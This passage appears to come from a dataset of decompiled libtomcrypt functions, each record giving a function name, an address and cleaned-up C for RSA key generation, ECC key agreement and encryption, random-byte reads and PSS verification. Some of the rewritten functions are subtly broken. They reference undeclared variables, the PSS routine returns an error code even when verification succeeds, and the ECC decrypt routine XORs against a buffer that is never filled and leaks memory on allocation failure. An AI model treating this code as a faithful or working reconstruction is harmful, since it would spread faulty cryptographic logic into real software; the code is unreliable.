*param_9 = 0; \n                        \n                        memcpy(param_9 + 1, allocated_memory_ptr3, remaining_size);\n                        memcpy(param_9 + remaining_size + 1, allocated_memory_ptr1, __n);\n                        \n                        *param_10 = (size_based_on_param5 - size_based_on_param8) + -1 + remaining_size + 1;\n                    }\n                }\n            }\n        }\n    }\n    \n    free(allocated_memory_ptr3);\n    free(allocated_memory_ptr2);\n    free(allocated_memory_ptr1);\n    return return_status; \nLAB_0041f4d3:\n    \n    if (allocated_memory_ptr2 != (void *)0x0) {\n        free(allocated_memory_ptr2); \n    }\n    if (allocated_memory_ptr3 != (void *)0x0) {\n        free(allocated_memory_ptr3); \n    }\n    return 0xd; \n}"}
{"Function Name": "FUN_0041f7b0", "Address": "0041f7b0", "Source Code": "int FUN_0041f7b0(long input_ptr, size_t size, undefined8 context, uint type)\n{\n    int status; \n    byte *memory_ptr; \n    size_t returned_size; \n    bool is_negative; \n    int status_array[3]; \n    \n    if (input_ptr == 0) {\n        FUN_00410bc0(\"N != NULL\", \"libtomcrypt.c\", 0x6dd4);\n    }\n    \n    is_negative = (long)size < 0;\n    if (is_negative) {\n        size = -size; \n    }\n    status = 0x17; \n    \n    if (((size - 2 < 0x1ff) && (status = 0xc, type < 0x100)) &&\n        (&DAT_006495c0)[(long)(int)type * 10] != 0)) {\n        \n        \n        memory_ptr = (byte *)calloc(1, size);\n        if (memory_ptr != (byte *)0x0) { \n            do {\n                \n                returned_size = (*(code *)(&DAT_006495e8)[(long)(int)type * 10])(memory_ptr, size, context);\n                \n                \n                if (size != returned_size) {\n                    free(memory_ptr); \n                    return 9; \n                }\n                \n                \n                *memory_ptr |= 0xc0;\n                \n                memory_ptr[size - 1] |= (-!is_negative & 0xfeU) + 3;\n                \n                \n                status = (*DAT_006699a0)(input_ptr, memory_ptr, size);\n                \n                \n                if (status != 0 || (status = (*DAT_00669a48)(input_ptr, status_array), status != 0)) {\n                    free(memory_ptr); \n                    return status; \n                }\n            } while (status_array[0] == 0); \n            \n            free(memory_ptr); \n            status = 0; \n        }\n    }\n    return status; \n}"}
{"Function Name": "FUN_0041f920", "Address": "0041f920", "Source Code": "ulong FUN_0041f920(undefined8 param_1,uint param_2,int param_3,ulong param_4,undefined4 *param_5)\n{\nuint uVar1;\nint iVar2;\nulong uVar3;\nundefined4 *puVar4;\nundefined4 *puVar5;\nundefined8 uVar6;\nundefined8 local_60;\nundefined8 local_58;\nundefined8 local_50;\nundefined8 local_48;\nundefined8 local_40 [2];\nif (DAT_00669900 == 0) {\nFUN_00410bc0(\"ltc_mp.name != NULL\",\"libtomcrypt.c\",0x7117);\n}\nif (param_5 == (undefined4 *)0x0) {\nFUN_00410bc0(\"key != NULL\",\"libtomcrypt.c\",0x7118);\n}\nif (0x180 < param_3 - 0x80U) {\nreturn 3;\n}\nif ((long)param_4 < 3) {\nreturn 0x10;\n}\nif ((param_4 & 1) == 0) {\nreturn 0x10;\n}\nif (0xff < param_2) {\nreturn 0xc;\n}\nif ((&DAT_006495c0)[(long)(int)param_2 * 10] == 0) {\nreturn 0xc;\n}\nuVar3 = FUN_0041ae70(&local_60,&local_58,&local_50,&local_48,local_40,0);\nif ((int)uVar3 != 0) {\nreturn uVar3;\n}\nuVar1 = (*DAT_00669938)(local_40[0],param_4);\nuVar3 = (ulong)uVar1;\nif (uVar1 == 0) {\ndo {\nuVar1 = FUN_0041f7b0(local_60,(long)(param_3 >> 1),param_1,param_2);\nuVar3 = (ulong)uVar1;\nif (uVar1 != 0) goto LAB_0041fa5a;\nuVar1 = (*DAT_006699c0)(local_60,1,local_50);\nuVar3 = (ulong)uVar1;\nif (uVar1 != 0) goto LAB_0041fa5a;\nuVar1 = (*DAT_006699f8)(local_50,local_40[0],local_48);\nuVar3 = (ulong)uVar1;\nif (uVar1 != 0) goto LAB_0041fa5a;\niVar2 = (*DAT_00669960)(local_48,1);\n} while (iVar2 != 0);\ndo {\nuVar1 = FUN_0041f7b0(local_58,(long)(param_3 >> 1),param_1,param_2);\nuVar3 = (ulong)uVar1;\nif (uVar1 != 0) goto LAB_0041fa5a;\nuVar1 = (*DAT_006699c0)(local_58,1,local_50);\nuVar3 = (ulong)uVar1;\nif (uVar1 != 0) goto LAB_0041fa5a;\nuVar1 = (*DAT_006699f8)(local_50,local_40[0],local_48);\nuVar3 = (ulong)uVar1;\nif (uVar1 != 0) goto LAB_0041fa5a;\niVar2 = (*DAT_00669960)(local_48,1);\n} while (iVar2 != 0);\nuVar1 = (*DAT_006699c0)(local_60,1,local_48);\nuVar3 = (ulong)uVar1;\nif (uVar1 == 0) {\nuVar1 = (*DAT_00669a00)(local_50,local_48,local_50);\nuVar3 = (ulong)uVar1;\nif (uVar1 == 0) {\npuVar5 = param_5 + 10;\npuVar4 = param_5 + 8;\nuVar6 = 0;\nuVar1 = FUN_0041ae70(param_5 + 2,param_5 + 4,param_5 + 6,param_5 + 0x10,param_5 + 0xe,\nparam_5 + 0xc,puVar4,puVar5,0);\nuVar3 = (ulong)uVar1;\nif (uVar1 == 0) {\nuVar1 = (*DAT_00669938)(*(undefined8 *)(param_5 + 2),param_4);\nuVar3 = (ulong)uVar1;\nif (uVar1 == 0) {\nuVar1 = (*DAT_00669a18)(*(undefined8 *)(param_5 + 2),local_50,\n*(undefined8 *)(param_5 + 4));\nuVar3 = (ulong)uVar1;\nif (uVar1 == 0) {\nuVar1 = (*DAT_006699c8)(local_60,local_58,*(undefined8 *)(param_5 + 6));\nuVar3 = (ulong)uVar1;\nif (uVar1 == 0) {\nuVar1 = (*DAT_006699c0)(local_60,1,local_50);\nuVar3 = (ulong)uVar1;\nif (uVar1 == 0) {\nuVar1 = (*DAT_006699c0)(local_58,1,local_48);\nuVar3 = (ulong)uVar1;\nif (uVar1 == 0) {\nuVar1 = (*DAT_006699e0)(*(undefined8 *)(param_5 + 4),local_50,0,\n*(undefined8 *)(param_5 + 0xe));\nuVar3 = (ulong)uVar1;\nif (uVar1 == 0) {\nuVar1 = (*DAT_006699e0)(*(undefined8 *)(param_5 + 4),local_48,0,\n*(undefined8 *)(param_5 + 0x10));\nuVar3 = (ulong)uVar1;\nif (uVar1 == 0) {\nuVar1 = (*DAT_00669a18)(local_58,local_60,*(undefined8 *)(param_5 + 0xc));\nuVar3 = (ulong)uVar1;\nif (uVar1 == 0) {\nuVar1 = (*DAT_00669930)(local_60,*(undefined8 *)(param_5 + 8));\nuVar3 = (ulong)uVar1;\nif (uVar1 == 0) {\nuVar1 = (*DAT_00669930)(local_58,*(undefined8 *)(param_5 + 10));\nuVar3 = (ulong)uVar1;\nif (uVar1 == 0) {\n*param_5 = 1;\ngoto LAB_0041fa93;\n}\n}\n}\n}\n}\n}\n}\n}\n}\n}\n}\n}\n}\n}\nLAB_0041fa5a:\nuVar6 = 0;\npuVar5 = *(undefined4 **)(param_5 + 10);\npuVar4 = *(undefined4 **)(param_5 + 8);\nFUN_0041aff0(*(undefined8 *)(param_5 + 4),*(undefined8 *)(param_5 + 2),\n*(undefined8 *)(param_5 + 6),*(undefined8 *)(param_5 + 0x10),\n*(undefined8 *)(param_5 + 0xe),*(undefined8 *)(param_5 + 0xc),puVar4,puVar5,0);\nLAB_0041fa93:\nFUN_0041aff0(local_40[0],local_48,local_50,local_60,local_58,0,puVar4,puVar5,uVar6);\nreturn uVar3;\n}\nLocal Variable: local_40 : undefined8\nLocal Variable: local_48 : undefined8\nLocal Variable: local_50 : undefined8\nLocal Variable: local_58 : undefined8\nLocal Variable: local_60 : undefined8\nLocal Variable: local_78 : undefined8\nLocal Variable: local_80 : undefined8\nLocal Variable: local_88 : undefined8"}
{"Function Name": "FUN_0041fd30", "Address": "0041fd30", "Source Code": "size_t FUN_0041fd30(void *output_buffer, size_t buffer_size)\n{\n    FILE *file_pointer; \n    size_t bytes_read; \n    \n    if (output_buffer == (void *)0x0) {\n        FUN_00410bc0(\"out != NULL\", \"libtomcrypt.c\", 0x6e92); \n    }\n    \n    \n    file_pointer = fopen(\"/dev/urandom\", \"rb\");\n    \n    \n    if (file_pointer == (FILE *)0x0) {\n        file_pointer = fopen(\"/dev/random\", \"rb\");\n    }\n    \n    \n    if (file_pointer != (FILE *)0x0) {\n        \n        if (setvbuf(file_pointer, (char *)0x0, 2, 0) == 0) {\n            \n            bytes_read = fread(output_buffer, 1, buffer_size, file_pointer);\n            fclose(file_pointer); \n            return bytes_read; \n        }\n        fclose(file_pointer); \n    }\n    \n    return 0; \n}"}
{"Function Name": "FUN_0041fdf0", "Address": "0041fdf0", "Source Code": "void FUN_0041fdf0(long inputPointer, undefined8 data)\n{\n    \n    if (inputPointer == 0) {\n        \n        handleError(\"out != NULL\", \"libtomcrypt.c\", 0x7305);\n    }\n    \n    processData(inputPointer, data, 0);\n}"}
{"Function Name": "FUN_0041ff30", "Address": "0041ff30", "Source Code": "int FUN_0041ff30(undefined8 input_param, size_t output_size, long input_data, long output_data, undefined8 key_param,\nundefined8 iv_param, uint algorithm_id, int operation_mode, undefined4 *status_ptr, long key_ptr)\n{\n    int intermediate_result; \n    int return_status; \n    size_t calculated_size; \n    void *allocated_memory; \n    \n    if (input_data == 0) {\n        FUN_00410bc0(\"out != NULL\", \"libtomcrypt.c\", 0x6f1d);\n    }\n    \n    if (output_data == 0) {\n        FUN_00410bc0(\"outlen != NULL\", \"libtomcrypt.c\", 0x6f1e);\n    }\n    \n    if (key_ptr == 0) {\n        FUN_00410bc0(\"key != NULL\", \"libtomcrypt.c\", 0x6f1f);\n    }\n    \n    if (status_ptr == (undefined4 *)0x0) {\n        FUN_00410bc0(\"stat != NULL\", \"libtomcrypt.c\", 0x6f20);\n    }\n    \n    *status_ptr = 0; \n    return_status = 0x18; \n    \n    if ((operation_mode - 1U < 2) &&\n        ((operation_mode != 2 ||\n        ((return_status = 0xb, algorithm_id < 0x100 && ((&DAT_0064e5c0)[(long)(int)algorithm_id * 0x1a] != 0)))))) {\n        \n        \n        intermediate_result = (*DAT_00669968)(*(undefined8 *)(key_ptr + 0x18));\n        \n        calculated_size = (*DAT_00669990)(*(undefined8 *)(key_ptr + 0x18));\n        return_status = 7; \n        \n        if (calculated_size == output_size) {\n            \n            allocated_memory = malloc(output_size);\n            \n            if (allocated_memory != (void *)0x0) {\n                \n                return_status = (*DAT_00669a80)(input_param, output_size, allocated_memory, (size_t *)&output_size, 1, key_ptr);\n                \n                if (return_status == 0) {\n                    \n                    if (operation_mode == 2) {\n                        return_status = FUN_0041ecd0(allocated_memory, output_size, key_param, iv_param, (long)intermediate_result, algorithm_id, input_data,\n                        output_data, status_ptr);\n                    }\n                    else {\n                        return_status = FUN_0041f630(allocated_memory, output_size, 2, (long)intermediate_result, input_data, output_data, status_ptr);\n                    }\n                }\n                \n                free(allocated_memory);\n            }\n        }\n    }\n    return return_status; \n}"}
{"Function Name": "FUN_004201b0", "Address": "004201b0", "Source Code": "undefined8\nFUN_004201b0(long input_ptr, undefined8 input_data, long output_ptr, ulong *output_length_ptr, undefined8 key_data,\nundefined8 iv_data, undefined8 additional_data, uint param_a, uint param_b, int param_c,\nlong key_ptr)\n{\n    int return_value; \n    ulong function_value; \n    undefined8 result_value; \n    \n    if (input_ptr == 0) {\n        FUN_00410bc0(\"in != NULL\", \"libtomcrypt.c\", 0x6f85); \n    }\n    \n    if (output_ptr == 0) {\n        FUN_00410bc0(\"out != NULL\", \"libtomcrypt.c\", 0x6f86); \n    }\n    \n    if (output_length_ptr == (ulong *)0x0) {\n        FUN_00410bc0(\"outlen != NULL\", \"libtomcrypt.c\", 0x6f87); \n    }\n    \n    if (key_ptr == 0) {\n        FUN_00410bc0(\"key != NULL\", \"libtomcrypt.c\", 0x6f88); \n    }\n    \n    if (1 < param_c - 1U) {\n        return 0x18; \n    }\n    \n    if (0xff < param_a) {\n        return 0xc; \n    }\n    \n    if ((&DAT_006495c0)[(long)(int)param_a * 10] == 0) {\n        return 0xc; \n    }\n    \n    return_value = (*DAT_00669968)(*(undefined8 *)(key_ptr + 0x18));\n    \n    function_value = (*DAT_00669990)(*(undefined8 *)(key_ptr + 0x18));\n    \n    if (param_c == 2) {\n        \n        if (0xff < param_b) {\n            return 0xb; \n        }\n        \n        if ((&DAT_0064e5c0)[(long)(int)param_b * 0x1a] == 0) {\n            return 0xb; \n        }\n    }\n    ulong local_output_length = *output_length_ptr; \n    \n    if (function_value <= local_output_length) {\n        \n        if (param_c == 2) {\n            \n            result_value = FUN_0041f1d0(input_ptr, input_data, key_data, iv_data, (long)return_value, additional_data,\n                                 CONCAT44((undefined4)((ulong)input_data >> 0x20), param_a),\n                                 CONCAT44((undefined4)((ulong)iv_data >> 0x20), param_b), output_ptr, &local_output_length);\n        } else {\n            \n            result_value = FUN_0041f740(input_ptr, input_data, 2, (long)return_value, additional_data, param_a, output_ptr, &local_output_length);\n        }\n        return_value = (int)result_value; \n        \n        if (return_value != 0) {\n            return result_value; \n        }\n        \n        return (*DAT_00669a80)(output_ptr, local_output_length, output_ptr, output_length_ptr, 0, key_ptr);\n    }\n    *output_length_ptr = function_value; \n    return 6; \n}"}
{"Function Name": "FUN_004205c0", "Address": "004205c0", "Source Code": "void FUN_004205c0(undefined *input_pointer,long length)\n{\n    \n    if (input_pointer == (undefined *)0x0) {\n        \n        FUN_00410bc0(\"out != ((void *)0)\",\"libtomcrypt.c\",0x7354);\n    }\n    \n    \n    if (length != 0) {\n        \n        undefined *end_pointer = input_pointer + length;\n        \n        \n        do {\n            *input_pointer++ = 0; \n        } while (input_pointer != end_pointer); \n    }\n    \n    return; \n}"}
{"Function Name": "FUN_00420610", "Address": "00420610", "Source Code": "undefined4 FUN_00420610(long key, undefined *output_buffer, ulong *output_length)\n{\n    ulong calculated_size; \n    int element_count; \n    code *function_pointer; \n    long return_value; \n    size_t size; \n    undefined temporary_storage[264]; \n    \n    if (key == 0) {\n        FUN_00410bc0(\"key != NULL\", \"libtomcrypt.c\", 0x59c7); \n    }\n    \n    if (output_buffer == (undefined *)0x0) {\n        FUN_00410bc0(\"out != NULL\", \"libtomcrypt.c\", 0x59c8); \n    }\n    \n    if (output_length == (ulong *)0x0) {\n        FUN_00410bc0(\"outlen != NULL\", \"libtomcrypt.c\", 0x59c9); \n    }\n    \n    element_count = 0; \n    int *predefined_array = &DAT_0043de58; \n    \n    while (*predefined_array++ != 0) {\n        element_count++; \n    }\n    \n    if ((*(int *)(key + 4) < element_count) && (-2 < *(int *)(key + 4))) {\n        size = (size_t)**(int **)(key + 8); \n        calculated_size = size * 2 + 1; \n        \n        if (*output_length < calculated_size) {\n            *output_length = calculated_size; \n            return 6; \n        } else {\n            *output_buffer = 4; \n            FUN_004205c0(temporary_storage, 0x100); \n            function_pointer = DAT_00669998; \n            return_value = (*DAT_00669990)(*(undefined8 *)(key + 0x10)); \n            (*function_pointer)(*(undefined8 *)(key + 0x10), temporary_storage + (size - return_value)); \n            memcpy(output_buffer + 1, temporary_storage, size); \n            FUN_004205c0(temporary_storage, 0x100); \n            return_value = (*DAT_00669990)(*(undefined8 *)(key + 0x18)); \n            (*function_pointer)(*(undefined8 *)(key + 0x18), temporary_storage + (size - return_value)); \n            memcpy(output_buffer + size + 1, temporary_storage, size); \n            *output_length = calculated_size; \n            return 0; \n        }\n    }\n    return 0x10; \n}"}
{"Function Name": "FUN_004207a0", "Address": "004207a0", "Source Code": "int FUN_004207a0(int *private_key,long public_key,long output,ulong *output_length)\n{\n    int current_value; \n    code *function_pointer; \n    undefined8 *memory_pointer; \n    ulong unsigned_long_value; \n    int return_value; \n    undefined8 intermediate_results[2]; \n    \n    if (private_key == (int *)0x0) {\n        FUN_00410bc0(\"private_key != NULL\",\"libtomcrypt.c\",0x5d92);\n    }\n    \n    if (public_key == 0) {\n        FUN_00410bc0(\"public_key != NULL\",\"libtomcrypt.c\",0x5d93);\n    }\n    \n    if (output == 0) {\n        FUN_00410bc0(\"out != NULL\",\"libtomcrypt.c\",0x5d94);\n    }\n    \n    if (output_length == (ulong *)0x0) {\n        FUN_00410bc0(\"outlen != NULL\",\"libtomcrypt.c\",0x5d95);\n    }\n    \n    if (*private_key != 1) {\n        return 0xf; \n    }\n    \n    return_value = 0; \n    int *data_pointer = &DAT_0043de58; \n    \n    while ((current_value = *data_pointer) != 0) {\n        return_value++; \n        data_pointer += 0xe; \n    }\n    \n    \n    if ((private_key[1] < return_value) && (-2 < private_key[1])) {\n        return_value = 0; \n        data_pointer = &DAT_0043de58; \n        \n        while ((current_value = *data_pointer) != 0) {\n            return_value++; \n            data_pointer += 0xe; \n        }\n        \n        \n        if ((*(int *)(public_key + 4) < return_value) && (-2 < *(int *)(public_key + 4))) {\n            \n            if (strcmp(*(char **)(*(long *)(private_key + 2) + 8), *(char **)(*(long *)(public_key + 8) + 8)) != 0) {\n                return 0xe; \n            }\n            memory_pointer = (undefined8 *)FUN_0041af90(); \n            if (memory_pointer == (undefined8 *)0x0) {\n                return 0xd; \n            }\n            return_value = (*DAT_00669910)(intermediate_results); \n            if (return_value == 0) { \n                return_value = (*DAT_00669980)(intermediate_results[0], *(undefined8 *)(*(long *)(private_key + 2) + 0x10), 0x10); \n                \n                if ((return_value == 0) && (return_value = (*DAT_00669a50)(*(undefined8 *)(private_key + 10), public_key + 0x10, memory_pointer, intermediate_results[0], 1), return_value == 0)) {\n                    unsigned_long_value = (*DAT_00669990)(intermediate_results[0]); \n                    \n                    if (*output_length < unsigned_long_value) {\n                        *output_length = unsigned_long_value; \n                        return_value = 6; \n                    } else {\n                        FUN_004205c0(output, unsigned_long_value); \n                        function_pointer = DAT_00669998; \n                        long another_value = (*DAT_00669990)(*memory_pointer); \n                        return_value = (*function_pointer)(*memory_pointer, (unsigned_long_value - another_value) + output); \n                        if (return_value == 0) {\n                            *output_length = unsigned_long_value; \n                        }\n                    }\n                }\n                (*DAT_00669920)(intermediate_results[0]); \n                FUN_0041ba50(memory_pointer); \n                return return_value; \n            }\n            FUN_0041ba50(memory_pointer); \n            return return_value; \n        }\n    }\n    return 0x10; \n}"}
{"Function Name": "FUN_00420a20", "Address": "00420a20", "Source Code": "ulong FUN_00420a20(long input_param, undefined8 input_value, long output_param, ulong *output_length_ptr, int *key_ptr)\n{\n    uint result_code; \n    uint temp_result; \n    ulong function_result; \n    void *first_memory_block; \n    void *second_memory_block; \n    void *third_memory_block; \n    ulong loop_index; \n    undefined8 local_output_length; \n    ulong local_temp_length; \n    undefined local_buffer[48]; \n    undefined4 local_array[2]; \n    undefined *local_reference; \n    undefined8 local_value_1; \n    undefined4 local_value_2; \n    undefined4 local_value_3; \n    void *first_pointer; \n    undefined8 local_value_4; \n    undefined4 local_value_5; \n    undefined4 local_value_6; \n    void *third_pointer; \n    ulong local_value_7; \n    \n    if (input_param == 0) {\n        FUN_00410bc0(\"in != NULL\", \"libtomcrypt.c\", 0x5a80);\n    }\n    \n    if (output_param == 0) {\n        FUN_00410bc0(\"out != NULL\", \"libtomcrypt.c\", 0x5a81);\n    }\n    \n    if (output_length_ptr == (ulong *)0x0) {\n        FUN_00410bc0(\"outlen != NULL\", \"libtomcrypt.c\", 0x5a82);\n    }\n    \n    if (key_ptr == (int *)0x0) {\n        FUN_00410bc0(\"key != NULL\", \"libtomcrypt.c\", 0x5a83);\n    }\n    \n    if (*key_ptr != 1) {\n        return 0xf; \n    }\n    local_array[0] = 7; \n    local_value_1 = 0x20; \n    local_value_2 = 0; \n    local_reference = local_138; \n    function_result = FUN_00418740(input_param, input_value, local_array, 1, 1); \n    \n    if ((int)function_result != 0) {\n        return function_result; \n    }\n    result_code = FUN_00414370(local_138, local_value_1); \n    \n    if (0xff < result_code || (&DAT_0064e5c0)[(long)(int)result_code * 0x1a] == 0) {\n        return 7; \n    }\n    \n    first_memory_block = malloc(0x100);\n    second_memory_block = malloc(0x100);\n    third_memory_block = malloc(0x80);\n    \n    if (first_memory_block == (void *)0x0 || second_memory_block == (void *)0x0 || third_memory_block == (void *)0x0) {\n        \n        if (first_memory_block != (void *)0x0) {\n            free(first_memory_block);\n        }\n        if (second_memory_block != (void *)0x0) {\n            free(second_memory_block);\n        }\n        return 0xd; \n    }\n    local_value_3 = 5; \n    local_value_4 = 0x100; \n    local_value_5 = 0; \n    local_value_6 = 5; \n    local_value_7 = 0x80; \n    first_pointer = first_memory_block; \n    third_pointer = third_memory_block; \n    temp_result = FUN_00418740(input_param, input_value, local_array, 3, 1); \n    \n    if (temp_result == 0) {\n        temp_result = FUN_0041b270(first_pointer, local_value_4, local_buffer, 0); \n        \n        if (temp_result == 0) {\n            local_output_length = 0x100; \n            temp_result = FUN_004207a0(key_ptr, local_buffer, second_memory_block, &local_output_length); \n            \n            if (temp_result == 0) {\n                FUN_0041b230(local_buffer); \n                local_temp_length = 0x80; \n                result_code = FUN_0041aa70(result_code, second_memory_block, local_output_length, second_memory_block, &local_temp_length); \n                \n                if (result_code == 0) {\n                    \n                    if (local_temp_length < local_value_7) {\n                        function_result = 7; \n                    } else if (*output_length_ptr < local_value_7) { \n                        *output_length_ptr = local_value_7; \n                        function_result = 6; \n                    } else {\n                        \n                        for (loop_index = 0; loop_index < local_value_7; loop_index++) {\n                            *(byte *)(output_param + loop_index) = *(byte *)((long)second_memory_block + loop_index) ^ *(byte *)((long)third_memory_block + loop_index);\n                        }\n                        *output_length_ptr = loop_index; \n                    }\n                }\n            }\n        } else {\n            FUN_0041b230(local_buffer); \n        }\n    }\n    \n    free(first_memory_block);\n    free(second_memory_block);\n    free(third_memory_block);\n    return function_result; \n}"}
{"Function Name": "FUN_00420e00", "Address": "00420e00", "Source Code": "ulong FUN_00420e00(long input_param, ulong data_length, long output_param, long output_length, undefined8 key_param,\nuint key_size, uint key_index, long key_pointer)\n{\n    uint return_code; \n    ulong result_code; \n    void *memory_ptr_1; \n    void *memory_ptr_2; \n    void *memory_ptr_3; \n    long casted_key_index; \n    ulong allocated_length; \n    undefined8 buffer_size; \n    undefined local_buffer[56]; \n    \n    if (input_param == 0) {\n        FUN_00410bc0(\"in != NULL\", \"libtomcrypt.c\", 0x5b18);\n    }\n    \n    if (output_param == 0) {\n        FUN_00410bc0(\"out != NULL\", \"libtomcrypt.c\", 0x5b19);\n    }\n    \n    if (output_length == 0) {\n        FUN_00410bc0(\"outlen != NULL\", \"libtomcrypt.c\", 0x5b1a);\n    }\n    \n    if (key_pointer == 0) {\n        FUN_00410bc0(\"key != NULL\", \"libtomcrypt.c\", 0x5b1b);\n    }\n    \n    if (0xff < key_size || (&DAT_006495c0)[(long)(int)key_size * 10] == 0) {\n        return 0xc; \n    }\n    casted_key_index = (long)(int)key_index; \n    \n    if (0xff < key_index || (&DAT_0064e5c0)[casted_key_index * 0x1a] == 0 || (ulong)(&DAT_0064e5d0)[casted_key_index * 0x1a] < data_length) {\n        return 0xb; \n    }\n    \n    result_code = FUN_0041c770(key_param, key_size, local_buffer, *(undefined8 *)(key_pointer + 8));\n    if ((int)result_code != 0) {\n        return result_code; \n    }\n    \n    memory_ptr_1 = malloc(0x100);\n    memory_ptr_2 = malloc(0x100);\n    memory_ptr_3 = malloc(0x80);\n    \n    if ((memory_ptr_2 == (void *)0x0) || (memory_ptr_1 == (void *)0x0)) {\n        if (memory_ptr_1 == (void *)0x0) goto LAB_00420f31; \n    } else if (memory_ptr_3 != (void *)0x0) { \n        buffer_size = 0x100; \n        \n        return_code = FUN_0041a480(memory_ptr_1, &buffer_size, 0, local_buffer);\n        if (return_code == 0) { \n            allocated_length = 0x100; \n            \n            return_code = FUN_004207a0(local_buffer, key_pointer, memory_ptr_2, &allocated_length);\n            if (return_code == 0) { \n                FUN_0041b230(local_buffer); \n                \n                return_code = FUN_0041aa70(key_index, memory_ptr_2, allocated_length, memory_ptr_3, &allocated_length);\n                if (return_code == 0) { \n                    result_code = 0; \n                    \n                    if (data_length != 0) {\n                        do {\n                            *(byte *)((long)memory_ptr_3 + result_code) ^= *(byte *)(input_param + result_code);\n                            result_code++; \n                        } while (result_code != data_length); \n                    }\n                    \n                    return_code = FUN_00419720(output_param, output_length, 7, (&DAT_0064e660)[casted_key_index * 0x1a],\n                                          &DAT_0064e5e0 + casted_key_index * 0xd0, 5, buffer_size, memory_ptr_1, 5, data_length, memory_ptr_3, 0, 0, 0);\n                }\n                goto LAB_00421148; \n            }\n        }\n    }\n    FUN_0041b230(local_buffer); \nLAB_00421148:\n    \n    free(memory_ptr_3);\n    free(memory_ptr_2);\n    free(memory_ptr_1);\n    return (ulong)return_code; \nLAB_00420f31:\n    \n    if (memory_ptr_2 != (void *)0x0) {\n        free(memory_ptr_2); \n    }\n    if (memory_ptr_3 != (void *)0x0) {\n        free(memory_ptr_3); \n    }\n    FUN_0041b230(local_buffer); \n    return 0xd; \n}"}
{"Function Name": "FUN_004211f0", "Address": "004211f0", "Source Code": "int FUN_004211f0(long inputPointer, undefined8 context, byte *dataBuffer, size_t bufferSize, ulong requiredSize,\nuint dataType, ulong flags, undefined4 *result)\n{\n    uint bitmask; \n    ulong dataSize; \n    int returnValue; \n    byte *allocatedMemory; \n    size_t adjustedSize; \n    ulong calculatedSize; \n    long dataIndex; \n    \n    if (inputPointer == 0) {\n        FUN_00410bc0(\"msghash != NULL\", \"libtomcrypt.c\", 0x6ba4);\n    }\n    \n    if (result == (undefined4 *)0x0) {\n        FUN_00410bc0(\"res != NULL\", \"libtomcrypt.c\", 0x6ba5);\n    }\n    *result = 0; \n    \n    if (0xff < dataType) {\n        return 0xb; \n    }\n    dataIndex = (long)(int)dataType; \n    \n    if ((&DAT_0064e5c0)[dataIndex * 0x1a] == 0) {\n        return 0xb; \n    }\n    dataSize = (&DAT_0064e5d0)[dataIndex * 0x1a]; \n    \n    calculatedSize = (ulong)((flags & 7) != 0) + (flags >> 3);\n    \n    if (calculatedSize < requiredSize || calculatedSize < dataSize + 2 + requiredSize || bufferSize != calculatedSize) {\n        return 0x16; \n    }\n    allocatedMemory = (byte *)malloc(bufferSize); \n    \n    if (allocatedMemory == (byte *)0x0) {\n        return 0xd; \n    }\n    \n    void *ptrs[3] = { malloc(bufferSize), malloc(bufferSize), malloc(bufferSize) };\n    \n    if (ptrs[0] == (void *)0x0 || ptrs[1] == (void *)0x0 || ptrs[2] == (void *)0x0) {\n        free(allocatedMemory); \n        \n        for (int i = 0; i < 3; i++) {\n            if (ptrs[i] != (void *)0x0) {\n                free(ptrs[i]);\n            }\n        }\n        return 0xd; \n    }\n    \n    if (dataBuffer[bufferSize - 1] == 0xbc) {\n        adjustedSize = ~dataSize + bufferSize; \n        memcpy(allocatedMemory, dataBuffer, adjustedSize); \n        memcpy(ptrs[2], dataBuffer + adjustedSize, dataSize); \n        \n        bitmask = 0xff >> (((char)bufferSize * '\\b' + '\\x01') - (char)flags & 0x1fU);\n        \n        if ((~bitmask & (uint)*dataBuffer) == 0) {\n            \n            returnValue = FUN_0041eae0(dataType, ptrs[2], dataSize, ptrs[0], adjustedSize);\n            if (returnValue != 0) {\n                goto cleanup; \n            }\n            \n            for (size_t index = 0; index != adjustedSize; index++) {\n                allocatedMemory[index] ^= *(byte *)((long)ptrs[0] + index);\n            }\n            *allocatedMemory &= (byte)bitmask; \n            \n            for (calculatedSize = 0; calculatedSize < ((bufferSize - dataSize) + -2) - requiredSize; calculatedSize++) {\n                if (allocatedMemory[calculatedSize] != 0) {\n                    goto check_one; \n                }\n            }\n            \n            if (allocatedMemory[calculatedSize] == 1) {\n                dataIndex = dataIndex * 0xd0; \n                \n                returnValue = (**(code **)(&DAT_0064e668 + dataIndex))(localVariable);\n                if (returnValue == 0) {\n                    FUN_004205c0(ptrs[0], 8); \n                    \n                    returnValue = (**(code **)(&DAT_0064e670 + dataIndex))(localVariable, ptrs[0], 8);\n                    if ((((returnValue == 0) &&\n                        (returnValue = (**(code **)(&DAT_0064e670 + dataIndex))(localVariable, inputPointer, context), returnValue == 0)) &&\n                        (returnValue = (**(code **)(&DAT_0064e670 + dataIndex))(localVariable, allocatedMemory + calculatedSize + 1, requiredSize), returnValue == 0)) &&\n                        (returnValue = (**(code **)(&DAT_0064e678 + dataIndex))(localVariable, ptrs[0]), returnValue == 0 &&\n                        (comparisonResult = memcmp(ptrs[0], ptrs[2], dataSize), comparisonResult == 0)))) {\n                        *result = 1; \n                    }\n                }\n            }\n        }\n    }\ncheck_one:\n    returnValue = 7; \ncleanup:\n    \n    for (int i = 0; i < 3; i++) {\n        free(ptrs[i]);\n    }\n    free(allocatedMemory); \n    return returnValue; \n}"}
{"Function Name": "FUN_00421640", "Address": "00421640", "Source Code": "int FUN_00421640(long signature, size_t hash_size, void *hash_data, size_t hash_length, uint flags, uint algorithm,\nundefined8 context, undefined4 *status, long key_data)\n{\n    uint function_result; \n    int return_value; \n    size_t data_size; \n    void *allocated_memory; \n    ulong ulong_value; \n    long algorithm_index; \n    \n    if (hash_data == (void *)0x0) {\n        FUN_00410bc0(\"hash != NULL\", \"libtomcrypt.c\", 0x723c); \n    }\n    \n    if (signature == 0) {\n        FUN_00410bc0(\"sig != NULL\", \"libtomcrypt.c\", 0x723d); \n    }\n    \n    if (status == (undefined4 *)0x0) {\n        FUN_00410bc0(\"stat != NULL\", \"libtomcrypt.c\", 0x723e); \n    }\n    \n    if (key_data == 0) {\n        FUN_00410bc0(\"key != NULL\", \"libtomcrypt.c\", 0x723f); \n    }\n    \n    *status = 0; \n    return_value = 0x18; \n    \n    if (((flags & 0xfffffffd) == 1) &&\n        ((flags != 3 || (algorithm < 0x100 && ((&DAT_0064e5c0)[(long)(int)algorithm * 0x1a] != 0))))) {\n        \n        \n        function_result = (*DAT_00669968)(*(undefined8 *)(key_data + 0x18));\n        \n        data_size = (*DAT_00669990)(*(undefined8 *)(key_data + 0x18));\n        return_value = 7; \n        \n        if (data_size == hash_size) {\n            allocated_memory = malloc(hash_size); \n            if 